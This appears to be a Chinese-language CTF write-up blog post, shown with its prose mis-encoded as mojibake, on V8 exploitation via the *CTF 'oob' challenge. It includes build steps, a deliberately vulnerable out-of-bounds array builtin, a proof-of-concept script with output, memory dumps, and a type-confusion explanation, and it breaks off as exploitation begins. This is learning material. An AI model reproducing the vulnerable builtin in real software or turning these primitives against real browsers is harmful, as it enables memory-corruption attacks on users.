<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>V8åˆæ¢ | starssgo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">V8åˆæ¢</h1><a id="logo" href="/.">starssgo</a><p class="description">è¶ŠåŠªåŠ›,è¶Šå¹¸è¿ã€‚</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">V8åˆæ¢</h1><div class="post-meta">Dec 16, 2020<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a class="disqus-comment-count" href="/2020/12/16/V8%E5%88%9D%E6%8E%A2/#vcomment"><span class="valine-comment-count" data-xid="/2020/12/16/V8%E5%88%9D%E6%8E%A2/"></span><span> Comment</span></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#å‰æçŸ¥è¯†"><span class="toc-number">1.</span> <span class="toc-text">å‰æçŸ¥è¯†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç¯å¢ƒæ­å»º"><span class="toc-number">2.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å®‰è£…depot-tools"><span class="toc-number">2.1.</span> <span class="toc-text">å®‰è£…depot_tools</span></a></li></ol></li></ol></div></div><div class="post-content"><p>ç¬¬ä¸€æ¬¡æ¥è§¦æµè§ˆå™¨ï¼Œå‘çœŸçš„æ˜¯å¤ªå¤šäº†ã€‚ä»æ­å»ºç¯å¢ƒåˆ°å„ç§åˆ©ç”¨ï¼Œæ»¡æ»¡çš„å…¨æ˜¯å‘ã€‚<br>é€šè¿‡*CTFä¸­çš„oobé¢˜ç›®æ¥è®°å½•ä¸‹å­¦ä¹ å†ç¨‹ã€‚  </p>
<a id="more"></a>  
<h3 id="å‰æçŸ¥è¯†"><a href="#å‰æçŸ¥è¯†" class="headerlink" title="å‰æçŸ¥è¯†"></a>å‰æçŸ¥è¯†</h3><p>ä¸ªäººè¿›è¡Œäº†ä¸€äº›æ€»ç»“ã€‚é€šè¿‡åœ¨é€æ¸æ‘¸ç´¢ä¸­æ„Ÿå—åˆ°è‡ªå·±çš„ä¸€äº›æ¬ ç¼ºæ¥è¿›è¡Œæ•´ç†ã€‚</p>
<blockquote>
<p>å¸¸è§„PWNçŸ¥è¯†<br>åŸºç¡€JavaScriptè¯­æ³•    </p>
</blockquote>
<p>åœ¨å¤ç°é¢˜ç›®çš„æ—¶å€™ï¼Œç»™æˆ‘çš„æœ€å¤§æ„Ÿå—å°±æ˜¯JavaScriptçš„æ¬ ç¼ºã€‚ç”±äºå¸¸è§„å †æº¢å‡ºé—®é¢˜å·²ç»ç›¸å¯¹æ“…é•¿ã€‚ä½†æ˜¯åœ¨JavaScriptæ–¹é¢<br>å¤ªå¼±äº†ã€‚å¯¼è‡´å¥½å¤šæ—¶å€™æˆ‘éƒ½å·²ç»æƒ³åˆ°äº†åˆ©ç”¨æ€è·¯ä½†æ˜¯å†™ä¸å‡ºæ¥åˆ©ç”¨ä»¥è‡³äºè¦ä¸åœçš„å»çœ‹expå»å¤ç°ã€‚<br>æ‰€ä»¥æˆ‘æ„Ÿè§‰JavaScriptæ–¹é¢è‡³å°‘æˆ‘è¿˜æ˜¯éå¸¸æ¬ ç¼ºçš„ã€‚  </p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¿™ä¸ªåœ°æ–¹çœŸçš„æ˜¯å·¨å·¨å‘ã€‚  </p>
<h4 id="å®‰è£…depot-tools"><a href="#å®‰è£…depot-tools" class="headerlink" title="å®‰è£…depot_tools"></a>å®‰è£…depot_tools</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git  </span><br><span class="line"></span><br><span class="line">echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>è¿™è¾¹éœ€è¦è®¾ç½®ä¸ªä»£ç†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">netsh winhttp set proxy 127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">set HTTP_PROXY=http://127.0.0.1:7890   </span><br><span class="line"></span><br><span class="line">set HTTPS_PROXY=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„ç«¯å£è¦æ”¹æˆä½ ä»£ç†çš„ç«¯å£ã€‚<br>å®Œäº‹ä¹‹åæ€»ä¸èƒ½ä¸€è¾ˆå­éƒ½ç”¨ä»£ç†ï¼Œæ‰€ä»¥è¦å–æ¶ˆä»£ç†ã€‚  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy  </span><br><span class="line"> </span><br><span class="line">git config --global --unset https.proxy  </span><br><span class="line"></span><br><span class="line">netsh winhttp reset proxy  </span><br><span class="line"></span><br><span class="line">set HTTP_PROXY=  </span><br><span class="line"></span><br><span class="line">set HTTPS_PROXY=  </span><br><span class="line">```  </span><br><span class="line">#### å®‰è£…ninja</span><br></pre></td></tr></table></figure>
<p>git clone <a href="https://github.com/ninja-build/ninja.git" target="_blank" rel="noopener">https://github.com/ninja-build/ninja.git</a>  </p>
<p>cd ninja &amp;&amp; ./configure.py â€“bootstrap   </p>
<p>cmake -Bbuild-cmake -H.</p>
<p>cmake â€“build build-cmake</p>
<p>echo â€˜export PATH=$PATH:â€/path/to/ninjaâ€â€˜ &gt;&gt; ~/.bashrc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å…·ä½“çš„å»githubä¸Šçœ‹å®‰è£…æ–¹æ³•å§ï¼Œæ¯”è¾ƒç®€å•å°±ä¸åœ¨å¤ç°å®‰è£…äº†ã€‚  </span><br><span class="line">è®°å¾—å°†ninjaåŠ å…¥ç¯å¢ƒå˜é‡ã€‚    </span><br><span class="line">#### ç¼–è¯‘V8   </span><br><span class="line">è¿™ä¸€æ­¥æŒºæƒ¨çš„ã€‚æ¯æ¬¡ç¼–è¯‘éƒ½è¦å¥½é•¿æ—¶é—´ã€‚æ¯æ¬¡æ›´æ”¹æˆæ¼æ´ç‰ˆæœ¬å°±è¦é‡æ–°ç¼–è¯‘ã€‚</span><br></pre></td></tr></table></figure>
<p>fetch v8</p>
<p>cd v8</p>
<p>git reset â€“hard [commit hash with vulnerability]<br>#è¿™é‡Œæ”¹æˆæœ‰æ¼æ´çš„ç‰ˆæœ¬<br>gclient sync</p>
<p>#ç¼–è¯‘debugç‰ˆæœ¬<br>tools/dev/v8gen.py x64.debug<br>ninja -C out.gn/x64.debug d8<br>#ç¼–è¯‘releaseç‰ˆæœ¬</p>
<p>tools/dev/v8gen.py x64.release<br>ninja -C out.gn/x64.release d8 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#### gdbæ’ä»¶</span><br><span class="line">åœ¨.gdbinité‡Œé¢åŠ ä¸Š</span><br></pre></td></tr></table></figure>
<p>source /home/starssgo/V8/v8/tools/gdbinit_v8<br>source /home/starssgo/V8/v8/tools/gdb-v8-support.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘å°†`gdbinit`é‡å‘½åäº†`gdbinit_v8`  </span><br><span class="line">ç„¶åå°±å¯ä»¥åœ¨gdbé‡Œä½¿ç”¨è¿™å‡ ä¸ªå‚æ•°äº†(æš‚æ—¶ä»¥ä¸º)ã€‚ </span><br><span class="line">jobå‘½ä»¤</span><br><span class="line">![](V8åˆæ¢/1.jpg)   </span><br><span class="line">telescopeå‘½ä»¤  </span><br><span class="line">![](V8åˆæ¢/2.jpg)  </span><br><span class="line">è¿™é‡Œç¢°è§äº†ä¸€ç‚¹é˜´é—´çš„é—®é¢˜ï¼Œå½“æˆ‘ç”¨oobé¢˜ç›®çš„æ—¶å€™ï¼Œæˆ‘æŠŠå¸¦æ¼æ´ç‰ˆæœ¬çš„diffé™„ä¸Šå»ä¹‹åï¼Œä½¿ç”¨DEBUGç‰ˆæœ¬çš„d8æ— æ³•è¿è¡Œã€‚  </span><br><span class="line">ä½†æ˜¯releaseç‰ˆæœ¬çš„d8ä¸¢å¼ƒäº†å„ç§ç¬¦å·è¡¨ã€‚å¯¼è‡´gdbè°ƒè¯•å°±æŒºæ¶å¿ƒ(å…·ä½“è¡¨ç°ä¸ºæ— æ³•ä½¿ç”¨jobä¸telescopeå‘½ä»¤)ã€‚  </span><br><span class="line">ä»¥ä¸‹æ˜¯è§£å†³æ–¹æ¡ˆ,ç¼–è¯‘çš„æ—¶å€™æ·»åŠ å‚æ•°ï¼Œä¿ç•™releaseç‰ˆæœ¬çš„ä½¿ç”¨jobä¸telescopeå‘½ä»¤æ‰€éœ€è¦çš„ç¬¦å·è¡¨ã€‚</span><br></pre></td></tr></table></figure>
<p>gn gen out.gn/x64.release â€“args=â€™is_debug=false target_cpu=â€x64â€ v8_enable_backtrace = true v8_enable_disassembler = true v8_enable_object_print = true v8_enable_verify_heap = trueâ€™</p>
<p>ninja -C out.gn/x64.release d8</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### diffæ–‡ä»¶åˆ†æ  </span><br><span class="line">diffçš„ç¼–å†™æ˜¯ä½¿ç”¨CodeStubAssemblerè¯­è¨€å®ç°ï¼Œç›¸è¾ƒäºCè‰¹æ¥è¯´,å®ƒè¿è¡Œæ•ˆç‡æ›´é«˜ã€‚ </span><br><span class="line">#### æ·»åŠ å¯¹è±¡å±æ€§  </span><br><span class="line">åœ¨/src/bootstrapper.ccæ–‡ä»¶ä¸­çš„Genesis::InitializeGlobalæ–¹æ³•ï¼Œåœ¨åˆå§‹åŒ–protoå¯¹è±¡çš„ä»£ç ï¼Œæ–°å»ºä¸€è¡Œoobã€‚  </span><br><span class="line">![](V8åˆæ¢/3.jpg)  </span><br><span class="line">#### å®ç°æ–¹æ³•çš„åŠŸèƒ½</span><br></pre></td></tr></table></figure>
<p>+BUILTIN(ArrayOob){</p>
<ul>
<li>uint32_t len = args.length();  #å°†è¾“å…¥å‚æ•°ç»™len</li>
<li>if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); #å¦‚æœlen&gt;2,è¿”å›</li>
<li>Handle<JSReceiver> receiver;</JSReceiver></li>
<li>ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</li>
<li>isolate, receiver, Object::ToObject(isolate, args.receiver()));</li>
<li>Handle<JSArray> array = Handle<JSArray>::cast(receiver);</JSArray></JSArray></li>
<li>FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</li>
<li>uint32_t length = static_cast<uint32_t>(array-&gt;length()-&gt;Number());</uint32_t></li>
<li>if(len == 1){</li>
<li>//read</li>
<li>return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));   #è¯»å–ç¬¬lengthå…ƒç´ ï¼Œå­˜åœ¨è¶Šç•Œè¯»æ¼æ´ã€‚</li>
<li>}else{</li>
<li>//write</li>
<li>Handle<Object> value;</Object></li>
<li>ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</li>
<li>isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));</Object></li>
<li>elements.set(length,value-&gt;Number());  #è¶Šç•Œå†™æ¼æ´</li>
<li>return ReadOnlyRoots(isolate).undefined_value();</li>
<li>}</li>
<li>}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#### ç”Ÿæˆå¹¶å­˜å‚¨å¯¹è±¡  </span><br><span class="line">åœ¨src/builtins/builtins-definitions.hä¸‹æ–°å¢å®šä¹‰ã€‚  </span><br><span class="line">![](V8åˆæ¢/4.jpg)  </span><br><span class="line">æœ€åå…³è”å®ç°å‡½æ•°  </span><br><span class="line">![](V8åˆæ¢/5.jpg)  </span><br><span class="line">è‡³æ­¤ï¼Œdiffæ–‡ä»¶åˆ†æå®Œæ¯•ã€‚  </span><br><span class="line">### æ„å»ºd8</span><br></pre></td></tr></table></figure>
git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598<br>gclient sync -D<br>git apply &lt; oob.diff<br>gn gen out.gn/x64.release â€“args=â€™is_debug=false target_cpu=â€x64â€ v8_enable_backtrace = true v8_enable_disassembler = true v8_enable_object_print = true v8_enable_verify_heap = trueâ€™<br>ninja -C out.gn/x64.release d8<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¼–å†™å¦‚ä¸‹jsæ–‡ä»¶æ¥æµ‹è¯•æ¼æ´</span><br></pre></td></tr></table></figure>
// æ–°å»ºå¯¹è±¡<br>var test = [1,2];<br>//æ‰“å°teståœ°å€<br>%DebugPrint(test);<br>//æ–­ç‚¹<br>// %SystemBreak();<br>// 16è¿›åˆ¶æ‰“å°å€¼<br>console.log(â€œtest_num = â€œ + test);<br>var num = test.oob(); //å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆå°±ç›¸å½“ä¸æ‰“å°test[2].å­˜åœ¨è¶Šç•Œã€‚<br>console.log(â€œtest_num = â€œ + num);<br>// %SystemBreak();<br>test.oob(3); //æœ‰å‚æ•°ï¼Œç›¸å½“äºtest[2] = 0x20n;<br>num = test.oob();<br>console.log(â€œtest_num = â€œ + num);<br>console.log(â€œtest_num = â€œ + test);<br>// %SystemBreak();<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰“å°å¦‚ä¸‹æ‰€ç¤º</span><br></pre></td></tr></table></figure>
starssgo@ubuntu:~/V8/v8/out.gn/x64.release$ ./d8 â€“allow-natives-syntax tst.js<br>0x24745314e069 &lt;JSArray[2]&gt;<br>test_content = 1,2<br>test[2]_content = 1.36951968682494e-310<br>test[2]_content = 3<br>test_content = 1,2<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å¦‚ä¸Šé¢æ‰€ç¤ºï¼Œtest.oob()æ‰“å°å‡ºäº†å¹¶ä¸åœ¨å˜é‡èŒƒå›´å†…ä¹Ÿå°±æ˜¯test[2]çš„å†…å®¹ï¼Œè€Œæˆ‘ä»¬å¸¦å‚æ•°è°ƒç”¨äº†oob()åï¼Œtest[2] = è¾“å…¥å‚æ•°çš„å€¼ï¼Œä¸ºæ­¤ï¼Œè¯¥ç¨‹åºæœ‰ä¸€ä¸ª</span><br><span class="line">æ•°ç»„è¶Šç•Œæ¼æ´ã€‚  </span><br><span class="line"></span><br><span class="line">### åŸºç¡€çŸ¥è¯†  </span><br><span class="line">JavaScriptæ˜¯ä¸€ä¸ªè§£é‡Šæ‰§è¡Œè¯­è¨€ï¼Œv8å®é™…ä¸Šæ˜¯è¯¥è¯­è¨€çš„æ‰§è¡Œç¨‹åºã€‚  </span><br><span class="line">é¦–å…ˆï¼Œéœ€è¦äº†è§£v8æ‰§è¡Œè¿‡ç¨‹ã€‚v8åœ¨è¯»å–jsè¯­å¥åï¼Œé¦–å…ˆå°†è¯­å¥è§£æä¸ºè¯­æ³•æ ‘ï¼Œç„¶åé€šè¿‡è§£é‡Šå™¨å°†è¯­æ³•æ ‘å˜æˆå­—èŠ‚ç ï¼Œæœ€åé€šè¿‡å†…éƒ¨çš„è™šæ‹Ÿæœºå°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç æ¥æ‰§è¡Œã€‚   </span><br><span class="line">ä¸ºäº†åŠ å¿«è§£æè¿‡ç¨‹ï¼Œv8ä¼šè®°å½•æŸè¯­æ³•æ ‘çš„æ‰§è¡Œæ¬¡æ•°ï¼Œè‹¥æŸæ¬¡æ‰§è¡Œæ¬¡æ•°å¤§äºä¸€å®šæ•°é‡åï¼Œä¼šç›´æ¥å°†è¯¥è¯­æ³•è½¬æ¢ä¸ºæœºå™¨ç ï¼Œè¿™æ ·åœ¨åç»­è°ƒç”¨è¯¥è¯­æ³•æ ‘æ—¶ï¼Œç›´æ¥æ‰§è¡Œå¯¹åº”æœºå™¨ç ï¼Œè¿™å°±æ˜¯JITä¼˜åŒ–ã€‚  </span><br><span class="line">æˆ‘ä»¬çŸ¥é“ï¼Œæ•ˆç‡æé«˜çš„åŒæ—¶å¾€å¾€ä¼´éšç€ç¨‹åºä¸å®‰å…¨é—®é¢˜çš„äº§ç”Ÿã€‚å°±æ¯”å¦‚æœ¬æ¬¡åˆ©ç”¨çš„æ¼æ´ç±»å‹æ··æ·†ï¼Œå°±æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šå®ç°çš„ã€‚  </span><br><span class="line">ç„¶åæ˜¯å¯¹è±¡ç»“æ„ï¼Œæˆ‘ä»¬ä¾ç„¶åŸºäºä¸Šé¢çš„jsä»£ç ï¼Œå°†testå˜ä¸ºfloatç±»å‹ï¼Œæ”¾å¼€`%SystemBreak()`æ³¨é‡Šã€‚æ¥æŸ¥çœ‹testçš„å¯¹è±¡ç»“æ„ã€‚   </span><br><span class="line"> ä»£ç å¦‚ä¸‹ã€‚</span><br></pre></td></tr></table></figure>
var test = [1.1,2.1];<br>//æ‰“å°teståœ°å€<br>%DebugPrint(test);<br> //æ–­ç‚¹<br>%SystemBreak();<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åæˆ‘ä»¬æ ¹æ®å¦‚ä¸‹å‘½ä»¤æ¥è°ƒè¯•</span><br></pre></td></tr></table></figure>
gdb ./d8<br>set args â€“allow-natives-syntax ./tst.js //åŠ è½½js<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡job testçš„åœ°å€ï¼Œå¯ä»¥æŸ¥çœ‹ç»“æ„ã€‚</span><br></pre></td></tr></table></figure>
gdb-peda$ job 0x148dc1d0e0c9<br>0x148dc1d0e0c9: [JSArray]<ul>
<li>map: 0x14e575602ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</li>
<li>prototype: 0x2de543ed1111 &lt;JSArray[0]&gt;</li>
<li>elements: 0x148dc1d0e0a9 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]</li>
<li>length: 2</li>
<li>properties: 0x289412e80c71 &lt;FixedArray[0]&gt; {<br> #length: 0x1d2635d401a9 <AccessorInfo> (const accessor descriptor)<br>}</AccessorInfo></li>
<li>elements: 0x148dc1d0e0a9 &lt;FixedDoubleArray[2]&gt; {<pre><code>0: 1.1
1: 2.1</code></pre>}</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">| åç§° | ä½œç”¨ |</span><br><span class="line">| ---- | ----------- |</span><br><span class="line">| map | è¡¨æ˜å¯¹è±¡ç±»å‹ |  </span><br><span class="line">| prototype | prototype | </span><br><span class="line">| elements | æŒ‡å‘å…ƒç´ å¯¹è±¡ | </span><br><span class="line">| Length | å…ƒç´ ä¸ªæ•° |  </span><br><span class="line">| properties | å±æ€§ |  </span><br><span class="line">  </span><br><span class="line">é¦–å…ˆæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹elementså¯¹è±¡ã€‚</span><br></pre></td></tr></table></figure>
<p>gdb-peda$ telescope 0x148dc1d0e0a8<br>0000| 0x148dc1d0e0a8 â€“&gt; 0x289412e814f9 â€“&gt; 0x289412e801<br>0008| 0x148dc1d0e0b0 â€“&gt; 0x200000000    #length<br>0016| 0x148dc1d0e0b8 â€“&gt; 0x3ff199999999999a  #1.1åœ¨å†…å­˜ä¸­çš„å­˜å‚¨<br>0024| 0x148dc1d0e0c0 â€“&gt; 0x4000cccccccccccd  # 2.2åœ¨å†…å­˜ä¸­çš„å­˜å‚¨<br>0032| 0x148dc1d0e0c8 â€“&gt; 0x14e575602ed9 â€“&gt; 0x40000289412e801    # map<br>0040| 0x148dc1d0e0d0 â€“&gt; 0x289412e80c71 â€“&gt; 0x289412e808<br>0048| 0x148dc1d0e0d8 â€“&gt; 0x148dc1d0e0a9 â€“&gt; 0x289412e814<br>0056| 0x148dc1d0e0e0 â€“&gt; 0x200000000</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">é‚£ä¹ˆç»“æ„ç±»å‹ä¸º</span><br><span class="line">![](V8åˆæ¢/6.jpg)  </span><br><span class="line"></span><br><span class="line">å…¶ä¸­çš„mapä¸elementsæ˜¯æˆ‘ä»¬è¦é‡ç‚¹å…³æ³¨çš„ç±»å‹ã€‚å› ä¸ºmapä»£è¡¨äº†å¯¹è±¡çš„ç±»å‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ”¹å˜å®ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®ç°</span><br><span class="line">ç±»å‹æ··æ·†ï¼ŒelementsæŒ‡å‘å…ƒç´ å¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ”¹å˜ä»–ï¼Œå¹¶ä¸”æ”¹å¯¹è±¡æ˜¯ä¸€ä¸ªæŒ‡é’ˆå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»»æ„åœ°å€è¯»å†™ã€‚  </span><br><span class="line">åœ¨æ­¤ç±»å‹ä¸­æˆ‘ä»¬å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ²ä¸æ›´æ”¹å¯¹è±¡çš„mapå€¼ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•æ¥ç±»å‹æ··æ·†ã€‚   </span><br><span class="line">æ­¤å¤„å¼•å…¥walkerfuzæ–‡ç« çš„ä¸€æ®µç»å…¸ä¾‹å­ã€‚  </span><br><span class="line">å¦‚æœæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªFloatArrayæµ®ç‚¹æ•°æ•°ç»„Aï¼Œç„¶åå®šä¹‰ä¸€ä¸ªå¯¹è±¡æ•°ç»„Bã€‚</span><br><span class="line">æ­£å¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®A[0]è¿”å›çš„æ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œè®¿é—®B[0]è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡å…ƒç´ ã€‚</span><br><span class="line">å¦‚æœå°†Bçš„ç±»å‹ä¿®æ”¹ä¸ºAçš„ç±»å‹ï¼Œé‚£ä¹ˆå†æ¬¡è®¿é—®B[0]æ—¶ï¼Œè¿”å›çš„å°±ä¸æ˜¯å¯¹è±¡å…ƒç´ B[0]ï¼Œè€Œæ˜¯B[0]å¯¹è±¡å…ƒç´ è½¬æ¢ä¸ºæµ®ç‚¹æ•°å³B[0]å¯¹è±¡çš„å†…å­˜åœ°å€äº†ï¼›</span><br><span class="line">å¦‚æœå°†Açš„ç±»å‹ä¿®æ”¹ä¸ºBçš„ç±»å‹ï¼Œé‚£ä¹ˆå†æ¬¡è®¿é—®A[0]æ—¶ï¼Œè¿”å›çš„å°±ä¸æ˜¯æµ®ç‚¹æ•°A[0]ï¼Œè€Œæ˜¯ä»¥A[0]ä¸ºå†…å­˜åœ°å€çš„ä¸€ä¸ªJavaScriptå¯¹è±¡äº†ã€‚</span><br><span class="line">é€šè¿‡ç±»å‹æ··æ·†ï¼Œèƒ½å¤Ÿå®ç°ä»¥ä¸‹ä¸¤ç§æ•ˆæœ:  </span><br><span class="line">&gt;`è®¡ç®—ä¸€ä¸ªå¯¹è±¡çš„åœ°å€addressOf`ï¼šå°†éœ€è¦è®¡ç®—å†…å­˜åœ°å€çš„å¯¹è±¡å­˜æ”¾åˆ°ä¸€ä¸ªå¯¹è±¡æ•°ç»„ä¸­çš„A[0]ï¼Œç„¶ååˆ©ç”¨ä¸Šè¿°ç±»å‹æ··æ·†æ¼æ´ï¼Œå°†å¯¹è±¡æ•°ç»„çš„Mapç±»å‹ä¿®æ”¹ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„ç±»å‹ï¼Œè®¿é—®A[0]å³å¯å¾—åˆ°æµ®ç‚¹æ•°è¡¨ç¤ºçš„ç›®æ ‡å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚  </span><br><span class="line">&gt;`å°†ä¸€ä¸ªå†…å­˜åœ°å€ä¼ªé€ ä¸ºä¸€ä¸ªå¯¹è±¡fakeObject`ï¼šå°†éœ€è¦ä¼ªé€ çš„å†…å­˜åœ°å€å­˜æ”¾åˆ°ä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„ä¸­çš„B[0]ï¼Œç„¶ååˆ©ç”¨ä¸Šè¿°ç±»å‹æ··æ·†æ¼æ´ï¼Œå°†æµ®ç‚¹æ•°æ•°ç»„çš„Mapç±»å‹ä¿®æ”¹ä¸ºå¯¹è±¡æ•°ç»„çš„ç±»å‹ï¼Œé‚£ä¹ˆB[0]æ­¤æ—¶å°±ä»£è¡¨äº†ä»¥è¿™ä¸ªå†…å­˜åœ°å€ä¸ºèµ·å§‹åœ°å€çš„ä¸€ä¸ªJSå¯¹è±¡äº†ã€‚  </span><br><span class="line">### æ¼æ´åˆ©ç”¨   </span><br><span class="line">é¦–å…ˆæˆ‘ä»¬è¦è¿›è¡Œç±»å‹æ··æ·†ï¼Œæˆ‘ä»¬è¦å…ˆçŸ¥é“mapçš„åœ°å€,åˆ©ç”¨ç©ºå‚æ•°oob()çš„è¯»ç‰¹æ€§æ¥è¯»å‡ºmapåœ°å€</span><br></pre></td></tr></table></figure>
<p>var obj = {â€œaâ€: 1};</p>
<p>var obj_array = [obj];</p>
<p>var float_array = [1.1,2.2];</p>
